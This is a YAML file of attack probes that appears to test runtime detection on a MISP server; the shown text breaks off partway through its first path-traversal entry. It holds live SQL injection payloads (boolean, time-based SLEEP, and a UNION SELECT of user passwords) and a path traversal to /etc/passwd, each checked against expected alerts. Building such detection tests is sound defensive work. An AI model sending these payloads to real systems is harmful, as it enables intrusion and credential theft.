  # ═══════════════════════════════════════════════════════════════════════════
  # SQL Injection probes (A03 Injection — unauthenticated + authenticated)
  # ═══════════════════════════════════════════════════════════════════════════

  # T1190 — SQLi via attribute search (authenticated)
  - name: api-sqli-attribute-search
    type: sqli
    http:
      method: POST
      path: /attributes/restSearch
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "returnFormat": "json",
          "value": "1' OR '1'='1",
          "type": "ip-dst",
          "searchall": true
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0002
        ruleName: Unexpected file access
        containerName: misp

  # T1190 — SQLi time-based via event search (authenticated)
  - name: api-sqli-event-timebased
    type: sqli
    http:
      method: POST
      path: /events/restSearch
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "returnFormat": "json",
          "timestamp": "1' AND SLEEP(5)--",
          "limit": "1"
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0002
        ruleName: Unexpected file access
        containerName: misp

  # T1190 — SQLi unauthenticated (events search)
  - name: sqli-events-search
    type: sqli
    http:
      method: GET
      path: /events/index
      queryParams:
        searchinfo: "' OR 1=1--"
      headers:
        Accept: application/json
    successIndicators:
      - statusCode: 200
    expectedDetections: []

  # T1190 — SQLi unauthenticated (UNION injection)
  - name: sqli-attributes-union
    type: sqli
    http:
      method: GET
      path: /attributes/search
      queryParams:
        value: "1' UNION SELECT password FROM users--"
      headers:
        Accept: application/json
    successIndicators:
      - statusCode: 200
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # LFI probes (A01 Broken Access Control)
  # ═══════════════════════════════════════════════════════════════════════════

  # T1083 — LFI: /etc/passwd
  - name: lfi-etc-passwd
    type: lfi
    http:
      method: GET
      path: /events/view/../../../../../../etc/passwd
    successIndicators:
